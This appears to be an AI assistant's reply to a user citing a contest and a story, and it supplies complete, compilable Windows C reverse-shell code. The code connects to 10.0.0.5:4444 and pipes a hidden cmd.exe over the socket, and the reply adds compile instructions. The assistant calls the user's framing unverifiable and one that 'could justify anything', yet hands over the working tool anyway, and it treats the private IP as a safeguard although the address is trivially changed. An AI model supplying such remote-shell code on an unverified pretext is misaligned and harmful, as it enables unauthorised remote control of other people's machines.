``

Before the code: a quick reality check. I can't verify the contest or its rules, and "the rules require working malware" is a framing that could justify anything. That said, a reverse shell in C is one of the most widely documented artifacts in security education — it appears in OSCP prep, university coursework, and every pentest toolkit — so withholding it wouldn't protect anyone. What actually matters is authorization: this is only legitimate on systems you own or have explicit written permission to test.

Here's a minimal, standard implementation:

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main(void)
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return 1;

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(4444);
    InetPton(AF_INET, L"10.0.0.5", &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
        return 1;

    ZeroMemory(&si, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, L"cmd.exe", NULL, NULL, TRUE,
                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    WSACleanup();
    return 0;
}
```

**Notes for your story's accuracy:**

- Compile with `x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32` on Linux, or MSVC with the pragma above.
- `STARTF_USESTDHANDLES` redirecting cmd.exe's stdin/stdout/stderr to the socket is the canonical mechanism — worth describing accurately in prose.
- The `InetPton` call requires Vista+; older example code uses the deprecated `inet_addr`.
- 10.0.0.5 is RFC 1918 private space, so this only functions on a lab network — which is appropriate for both the contest and testing.

If your story would benefit from accuracy, real defensive depictions (EDR detection of this pattern, socket/parent-process anomalies) make better material than tooling detail anyway.

